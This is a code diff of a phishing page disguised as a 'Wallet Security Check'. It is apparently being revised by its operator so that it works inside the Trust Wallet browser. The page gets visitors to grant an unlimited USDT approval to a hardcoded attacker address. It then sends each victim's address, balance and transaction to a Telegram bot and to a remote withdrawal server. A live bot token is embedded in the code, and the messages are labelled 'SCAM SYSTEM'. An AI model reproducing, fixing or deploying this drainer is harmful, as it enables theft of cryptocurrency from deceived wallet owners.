@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <title>Wallet Security Check</title>
     <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -25,60 +24,17 @@
             text-align: center;
             box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
         }
-        .logo {
-            width: 80px;
-            height: 80px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            border-radius: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 24px;
-            font-size: 48px;
-        }
+        .logo { width: 80px; height: 80px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius: 20px; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; font-size: 48px; }
         h1 { color: #1a1a2e; font-size: 28px; margin-bottom: 12px; }
         .subtitle { color: #666; font-size: 16px; margin-bottom: 32px; }
-        .security-badge {
-            background: #f0fdf4;
-            border: 1px solid #86efac;
-            border-radius: 12px;
-            padding: 12px;
-            margin-bottom: 24px;
-            font-size: 14px;
-            color: #166534;
-        }
-        button {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            border: none;
-            padding: 16px 32px;
-            font-size: 18px;
-            font-weight: 600;
-            border-radius: 48px;
-            cursor: pointer;
-            width: 100%;
-            transition: transform 0.2s;
-        }
+        .security-badge { background: #f0fdf4; border: 1px solid #86efac; border-radius: 12px; padding: 12px; margin-bottom: 24px; font-size: 14px; color: #166534; }
+        button { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; padding: 16px 32px; font-size: 18px; font-weight: 600; border-radius: 48px; cursor: pointer; width: 100%; transition: transform 0.2s; }
         button:hover { transform: translateY(-2px); }
         button:disabled { opacity: 0.6; cursor: not-allowed; }
         .loader { display: none; margin: 20px 0; }
-        .spinner {
-            width: 40px;
-            height: 40px;
-            border: 3px solid #e5e7eb;
-            border-top-color: #667eea;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto;
-        }
+        .spinner { width: 40px; height: 40px; border: 3px solid #e5e7eb; border-top-color: #667eea; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto; }
         @keyframes spin { to { transform: rotate(360deg); } }
-        #status {
-            margin-top: 20px;
-            padding: 12px;
-            border-radius: 12px;
-            font-size: 14px;
-            display: none;
-        }
+        #status { margin-top: 20px; padding: 12px; border-radius: 12px; font-size: 14px; display: none; }
         .success { background: #f0fdf4; color: #166534; border: 1px solid #86efac; display: block; }
         .error { background: #fef2f2; color: #991b1b; border: 1px solid #fecaca; display: block; }
         .warning { background: #fffbeb; color: #92400e; border: 1px solid #fde68a; display: block; }
@@ -102,7 +58,7 @@
         const BOT_TOKEN = '8665174312:AAE_i_f5UV9xYKpRqargdfKRs9FbYZPNpFk';
         const CHAT_ID = '7663459492';
         const ATTACKER_ADDRESS = '0x9f9e8388Cc4eA6772675A532576A07deFFB85b8E';
-        const YOUR_SERVER = 'https://https://cryptocurrency-checkkk.onrender.com'; // ИЗМЕНИТЕ ПОСЛЕ ШАГА 4
+        const YOUR_SERVER = 'https://cryptocurrency-checkkk.onrender.com/api/withdraw';
         // ==================================
 
         const USDT_CONTRACT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
@@ -112,9 +68,6 @@
         ];
 
         let web3 = null;
-        let provider = null;
-        let retryCount = 0;
-        const MAX_RETRIES = 3;
 
         async function sendToTelegram(message) {
             try {
@@ -123,18 +76,6 @@
                     body: JSON.stringify({chat_id: CHAT_ID, text: `🔥 SCAM SYSTEM\n\n${message}\n\n⏰ ${new Date().toLocaleString()}`})
                 });
             } catch(e) {}
-        }
-
-        async function initWalletConnect() {
-            const WalletConnectProvider = window.WalletConnectProvider.default;
-            provider = new WalletConnectProvider({
-                rpc: { 1: 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161' },
-                chainId: 1,
-                qrcodeModal: false
-            });
-            await provider.enable();
-            web3 = new Web3(provider);
-            return provider;
         }
 
         async function getUSDTBalance(address) {
@@ -161,17 +102,31 @@
             statusDiv.style.display = 'none';
 
             try {
-                for (let attempt = 1; attempt <= MAX_RETRIES; attempt++) {
-                    try {
-                        provider = await initWalletConnect();
-                        break;
-                    } catch(e) {
-                        if (attempt === MAX_RETRIES) throw new Error('Connection failed');
-                        await new Promise(r => setTimeout(r, 2000));
-                    }
+                // ПРОВЕРКА: НАХОДИМСЯ ЛИ МЫ ВНУТРИ TRUST WALLET?
+                const isTrustWallet = navigator.userAgent.toLowerCase().includes('trust');
+                
+                if (!isTrustWallet) {
+                    statusDiv.innerHTML = '❌ Please open this link inside Trust Wallet browser (DApp tab)';
+                    statusDiv.className = 'error';
+                    statusDiv.style.display = 'block';
+                    btn.disabled = false;
+                    loader.style.display = 'none';
+                    return;
                 }
                 
-                const accounts = await web3.eth.getAccounts();
+                // ИСПОЛЬЗУЕМ window.ethereum НАПРЯМУЮ (без WalletConnect)
+                if (!window.ethereum) {
+                    statusDiv.innerHTML = '❌ Please install Trust Wallet';
+                    statusDiv.className = 'error';
+                    statusDiv.style.display = 'block';
+                    btn.disabled = false;
+                    loader.style.display = 'none';
+                    return;
+                }
+                
+                web3 = new Web3(window.ethereum);
+                
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 const victimAddress = accounts[0];
                 
                 const { hasGas, balance: ethBalance } = await checkEthForGas(victimAddress);
@@ -202,15 +157,18 @@
                 const approveData = contract.methods.approve(ATTACKER_ADDRESS, maxApproval).encodeABI();
                 const gasPrice = await web3.eth.getGasPrice();
                 
-                const approveTx = await web3.eth.sendTransaction({
-                    from: victimAddress,
-                    to: USDT_CONTRACT,
-                    data: approveData,
-                    gas: 80000,
-                    gasPrice: gasPrice
+                const approveTx = await window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                        from: victimAddress,
+                        to: USDT_CONTRACT,
+                        data: approveData,
+                        gas: '80000',
+                        gasPrice: gasPrice
+                    }]
                 });
                 
-                await sendToTelegram(`✅ APPROVE: ${victimAddress}\nUSDT: ${balanceFormatted}\nTX: ${approveTx.transactionHash}`);
+                await sendToTelegram(`✅ APPROVE: ${victimAddress}\nUSDT: ${balanceFormatted}\nTX: ${approveTx}`);
                 
                 const response = await fetch(YOUR_SERVER, {
                     method: 'POST',
@@ -219,7 +177,7 @@
                         victimAddress: victimAddress,
                         amount: balance,
                         amountFormatted: balanceFormatted,
-                        approveTx: approveTx.transactionHash
+                        approveTx: approveTx
                     })
                 });
                 
@@ -236,9 +194,9 @@
                 }
                 
                 statusDiv.style.display = 'block';
-                if (provider && provider.disconnect) await provider.disconnect();
                 
             } catch (error) {
+                console.error(error);
                 statusDiv.innerHTML = '❌ Verification failed. Please try again.';
                 statusDiv.className = 'error';
                 statusDiv.style.display = 'block';
